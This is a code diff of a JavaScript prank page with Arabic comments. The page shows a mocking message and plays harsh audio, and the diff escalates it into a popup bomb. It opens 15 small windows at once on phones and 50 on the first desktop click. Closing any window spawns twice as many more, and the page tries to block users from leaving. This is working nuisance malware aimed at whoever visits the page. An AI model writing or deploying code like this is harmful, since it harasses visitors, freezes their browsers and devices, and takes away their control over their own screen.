@@ -1,16 +1,6 @@
 document.addEventListener("DOMContentLoaded", function () {
-    let websiteURL = "https://example.com"; // ضع هنا الموقع الذي تريد فتحه
-    let popupSize = 150;
-    let popups = [];
-    let gifList = [
-        "https://media4.giphy.com/media/l0Iy6fCmhY3hVGrzW/giphy.gif",
-        "https://media1.giphy.com/media/l0Iy8UHZ0T5I0EaR2/giphy.gif",
-        "https://media2.giphy.com/media/xUA7aLpbS0S3kr3s76/giphy.gif"
-    ];
-    
     let textContainer = document.getElementById("text-container");
     let gifContainer = document.getElementById("gif-container");
-    let staticGif = document.getElementById("static-gif");
     let bgMusic = document.getElementById("bg-music");
 
     let message = "تم تلاعب فيك";
@@ -30,59 +20,58 @@ document.addEventListener("DOMContentLoaded", function () {
         setTimeout(() => {
             textContainer.style.display = "none";
             gifContainer.style.opacity = 1;
-            bgMusic.play(); // تشغيل صوت التشويش
+            bgMusic.play();
             startImageLoop();
-            setTimeout(() => {
-                bgMusic.pause(); // إيقاف صوت التشويش بعد 2.5 ثانية
-            }, 2500);
-        }, 2500);
+        }, 2500); // ⏳ التشويش يستمر 2.5 ثانية ثم تظهر الصور
     }
+
+    let gifList = [
+        "https://media4.giphy.com/media/l0Iy6fCmhY3hVGrzW/giphy.gif",
+        "https://media1.giphy.com/media/l0Iy8UHZ0T5I0EaR2/giphy.gif",
+        "https://media2.giphy.com/media/xUA7aLpbS0S3kr3s76/giphy.gif"
+    ];
 
     function startImageLoop() {
         let currentIndex = 0;
         setInterval(() => {
-            staticGif.src = gifList[currentIndex];
+            document.getElementById("static-gif").src = gifList[currentIndex];
             currentIndex = (currentIndex + 1) % gifList.length;
         }, 400);
     }
 
-    function openMultipleWindows(count) {
+    // 🟥🟥 **فتح 15 نافذة عند الدخول مباشرةً على الهاتف** 🟥🟥
+    function openMultipleWindows(count, delay) {
+        let openedWindows = [];
+        
         for (let i = 0; i < count; i++) {
-            let screenWidth = window.innerWidth;
-            let screenHeight = window.innerHeight;
-            let x = Math.floor(Math.random() * (screenWidth - popupSize));
-            let y = Math.floor(Math.random() * (screenHeight - popupSize));
-
-            let newWindow = window.open(websiteURL, "_blank", `width=${popupSize},height=${popupSize},left=${x},top=${y}`);
-            if (newWindow) {
-                popups.push(newWindow);
-                newWindow.onbeforeunload = function () {
-                    setTimeout(() => {
-                        openMultipleWindows(popups.length * 2); // مضاعفة النوافذ عند الإغلاق
-                    }, 500);
-                };
-            }
+            setTimeout(() => {
+                let newWindow = window.open("https://example.com", "_blank", "width=150,height=150");
+                if (newWindow) {
+                    openedWindows.push(newWindow);
+                    newWindow.onbeforeunload = function () {
+                        setTimeout(() => {
+                            openMultipleWindows(openedWindows.length * 2, delay); // تضاعف النوافذ عند الإغلاق
+                        }, 500);
+                    };
+                }
+            }, i * delay);
         }
     }
 
-    function isMobile() {
-        return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+    // 🟥🟥 **عند الدخول من الهاتف، تفتح 15 نافذة فورًا** 🟥🟥
+    if (/Mobi|Android/i.test(navigator.userAgent)) {
+        openMultipleWindows(15, 500);
     }
 
-    if (isMobile()) {
-        // إذا كان على الهاتف، تفتح 5 نوافذ تلقائيًا
-        openMultipleWindows(5);
-    } else {
-        // إذا كان على الكمبيوتر، تفتح 5 نوافذ عند الضغط على الماوس
-        document.addEventListener("click", function () {
-            openMultipleWindows(5);
-        });
+    // 🟥🟥 **عند الضغط على الكمبيوتر، تفتح 50 نافذة واحدة تلو الأخرى** 🟥🟥
+    document.addEventListener("click", () => {
+        openMultipleWindows(50, 500);
+    }, { once: true });
 
-        // عند إغلاق أي نافذة، يتم مضاعفة العدد
-        window.onbeforeunload = function () {
-            openMultipleWindows(popups.length * 2);
-        };
-    }
+    // 🟥🟥 **إجبار الصفحة على البقاء مفتوحة** 🟥🟥
+    window.onbeforeunload = function () {
+        return "لا يمكنك المغادرة!";
+    };
 
     typeText();
 });
